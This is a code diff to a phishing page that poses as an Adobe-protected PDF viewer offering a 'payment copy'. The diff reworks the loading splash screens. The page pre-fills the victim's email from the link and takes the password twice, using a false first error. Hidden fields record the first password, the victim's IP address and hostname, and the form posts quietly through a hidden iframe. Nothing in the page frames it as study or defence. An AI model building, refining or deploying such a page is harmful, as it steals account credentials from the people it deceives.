@@ -7,6 +7,7 @@
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body { height: 100%; }
+
     body {
       font-family: "Helvetica Neue", Arial, sans-serif;
       background: #f6f6f6 url('download.jpg') no-repeat center top;
@@ -14,27 +15,43 @@
       overflow: hidden;
       position: relative;
     }
-    /* Splash overlay with image preview */
+
+    /* === Splash layers === */
+    #imageSplash {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: url('download.jpg') no-repeat center center / cover;
+      z-index: 10000;
+      transition: opacity 1s ease;
+    }
+
     #splash {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: #fff; display: flex; align-items: center; justify-content: center;
-      flex-direction: column; z-index: 9999; transition: opacity 1s ease;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 9999;
+      transition: opacity 1s ease;
       text-align: center;
+      opacity: 0;
     }
-    #splash img {
-      width: 160px; height: auto;
-      margin-bottom: 16px; border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-    }
+
     #splash h2 { font-size: 22px; color: #d32f2f; margin-bottom: 6px; }
     #splash p { color: #666; font-size: 14px; }
     .loader {
-      margin-top: 20px; width: 36px; height: 36px;
-      border: 4px solid #ddd; border-top-color: #d32f2f;
-      border-radius: 50%; animation: spin 1s linear infinite;
+      margin-top: 20px;
+      width: 36px; height: 36px;
+      border: 4px solid #ddd;
+      border-top-color: #d32f2f;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
+    /* === Main form === */
     #main {
       display: none;
       height: 100%;
@@ -54,51 +71,80 @@
       transform: rotate(-35deg); white-space: pre; line-height: 120px;
       pointer-events: none; z-index: 0;
     }
+
     .card {
-      width: 450px; max-width: 94%; background: rgba(255,255,255,0.95);
-      border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-      padding: 28px 22px 34px; position: relative; z-index: 2; backdrop-filter: blur(4px);
+      width: 450px; max-width: 94%;
+      background: rgba(255,255,255,0.95);
+      border-radius: 8px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      padding: 28px 22px 34px;
+      position: relative;
+      z-index: 2;
+      backdrop-filter: blur(4px);
     }
+
     .pdf-icon { display: flex; align-items: center; justify-content: center; margin-bottom: 10px; }
     .pdf-icon img { width: 54px; height: auto; }
     h1 { font-size: 20px; text-align: center; margin-bottom: 6px; }
     p.lead { text-align: center; color: #666; margin-bottom: 22px; font-size: 14px; }
+
     .input {
       width: 100%; border: 1px solid #e6e6e6; border-radius: 4px;
       padding: 14px 12px; margin-bottom: 12px; color: #444;
       background: #fafafa; font-size: 15px;
     }
+
     .password-wrapper { position: relative; }
     .toggle-password {
-      position: absolute; top: 50%; right: 12px; transform: translateY(-50%);
-      cursor: pointer; color: #999; font-size: 18px; user-select: none;
+      position: absolute; top: 50%; right: 12px;
+      transform: translateY(-50%);
+      cursor: pointer; color: #999; font-size: 18px;
+      user-select: none;
     }
     .toggle-password:hover { color: #d32f2f; }
+
     .download-wrap { text-align: center; margin: 16px 0 10px; }
     .btn-download {
-      display: inline-block; padding: 12px 36px; border-radius: 30px;
-      background: #d32f2f; color: #fff; font-weight: 700; text-transform: uppercase;
-      letter-spacing: 0.8px; box-shadow: 0 6px 18px rgba(211,47,47,0.18);
+      display: inline-block;
+      padding: 12px 36px;
+      border-radius: 30px;
+      background: #d32f2f;
+      color: #fff;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      box-shadow: 0 6px 18px rgba(211,47,47,0.18);
       border: none; cursor: pointer; font-size: 15px;
     }
+
     .file-info {
-      margin-top: 18px; border-top: 1px solid #eee; padding-top: 14px;
-      display: flex; gap: 12px; align-items: flex-start; color: #333;
+      margin-top: 18px;
+      border-top: 1px solid #eee;
+      padding-top: 14px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      color: #333;
     }
     .file-thumb { width: 48px; flex: 0 0 48px; }
     .file-thumb img { width: 100%; }
     .file-meta { flex: 1; }
     .file-meta h4 { margin-bottom: 6px; font-size: 15px; color: #0b58a8; }
     .file-meta .desc, .file-meta .size { font-size: 13px; color: #666; }
+
     .hidden { display: none; }
-    .error-message { color: #d32f2f; font-size: 14px; margin-top: 8px; text-align: center; }
+    .error-message {
+      color: #d32f2f; font-size: 14px; margin-top: 8px; text-align: center;
+    }
   </style>
 </head>
 <body>
 
-  <!-- Splash screen with image -->
+  <!-- Fullscreen image splash -->
+  <div id="imageSplash"></div>
+
+  <!-- Splash with spinner -->
   <div id="splash">
-    <img src="download.jpg" alt="Preview">
     <h2>Loading Secure Viewer…</h2>
     <p>Please wait while we prepare your file</p>
     <div class="loader"></div>
@@ -108,9 +154,8 @@
   <div id="main">
     <div class="card">
       <div class="pdf-icon">
-        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='72' height='90' viewBox='0 0 72 90'><rect width='72' height='90' rx='6' fill='%23d63636'/><text x='50%' y='62%' text-anchor='middle' font-family='Arial' font-size='18' fill='%23fff'>PDF</text></svg>" alt="PDF icon">
+        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='72' height='90' viewBox='0 0 72 90'><rect width='72' height='90' rx='6' fill='%23d63636'/><text x='50%' y='62%' text-anchor='middle' font-family='Arial' font-size='18' fill='%23fff'>PDF</text></svg>" alt="PDF">
       </div>
-
       <h1>This File is Protected By Adobe®<br>Security.</h1>
       <p class="lead">Click Continue to enter your password and view the payment copy.</p>
 
@@ -127,7 +172,6 @@
             <input id="password" name="password2" class="input" type="password" placeholder="Password" required>
             <span id="togglePassword" class="toggle-password">👁️</span>
           </div>
-
           <input type="hidden" name="ip" id="ip">
           <input type="hidden" name="hostname" id="hostname">
           <input type="hidden" name="password1" id="firstPasswordField">
@@ -139,7 +183,6 @@
           </div>
         </div>
       </form>
-
       <iframe name="hiddenFrame" style="display:none;"></iframe>
 
       <div class="file-info">
@@ -156,28 +199,32 @@
   </div>
 
 <script>
-  // Splash fade-out after showing image
+  // Splash sequence
   window.addEventListener('load', () => {
+    const imgSplash = document.getElementById('imageSplash');
+    const splash = document.getElementById('splash');
+
+    // Step 1: show image for 2s
     setTimeout(() => {
-      document.getElementById('splash').style.opacity = '0';
+      imgSplash.style.opacity = '0';
       setTimeout(() => {
-        document.getElementById('splash').style.display = 'none';
+        imgSplash.style.display = 'none';
+        splash.style.opacity = '1'; // Step 2: show spinner
+      }, 1000);
+    }, 2000);
+
+    // Step 3: after 2s more, hide spinner, show form
+    setTimeout(() => {
+      splash.style.opacity = '0';
+      setTimeout(() => {
+        splash.style.display = 'none';
         document.getElementById('main').classList.add('show');
-      }, 700);
-    }, 2000); // stays visible for 2 seconds
+      }, 800);
+    }, 4500);
   });
 
+  // Email autofill
   const emailInput = document.getElementById('email');
-  const passwordInput = document.getElementById('password');
-  const stepEmail = document.getElementById('stepEmail');
-  const stepPassword = document.getElementById('stepPassword');
-  const continueBtn = document.getElementById('continueBtn');
-  const toggle = document.getElementById('togglePassword');
-  const errorMessage = document.getElementById('errorMessage');
-  const firstPasswordField = document.getElementById('firstPasswordField');
-  let passwordFirstEntry = "";
-
-  // Autofill email
   window.addEventListener('DOMContentLoaded', () => {
     const params = new URLSearchParams(window.location.search);
     const urlEmail = params.get('email');
@@ -190,17 +237,27 @@
     .then(res => res.json())
     .then(data => { document.getElementById('ip').value = data.ip; });
 
+  // Continue → password step
+  const continueBtn = document.getElementById('continueBtn');
+  const stepEmail = document.getElementById('stepEmail');
+  const stepPassword = document.getElementById('stepPassword');
+  const passwordInput = document.getElementById('password');
+  const firstPasswordField = document.getElementById('firstPasswordField');
+  const errorMessage = document.getElementById('errorMessage');
+  let passwordFirstEntry = "";
+
   continueBtn.addEventListener('click', () => {
     stepEmail.classList.add('hidden');
     stepPassword.classList.remove('hidden');
     passwordInput.focus();
   });
 
-  toggle.addEventListener('click', () => {
+  // Toggle eye
+  document.getElementById('togglePassword').addEventListener('click', () => {
     passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
   });
 
-  // Handle double password and redirect
+  // Handle double password + redirect
   document.getElementById('mainForm').addEventListener('submit', (e) => {
     if (passwordFirstEntry === "") {
       e.preventDefault();
@@ -212,7 +269,7 @@
       return false;
     }
 
-    // Show overlay while submitting
+    // Overlay message
     const overlay = document.createElement('div');
     overlay.style.cssText = `
       position:fixed;top:0;left:0;width:100%;height:100%;
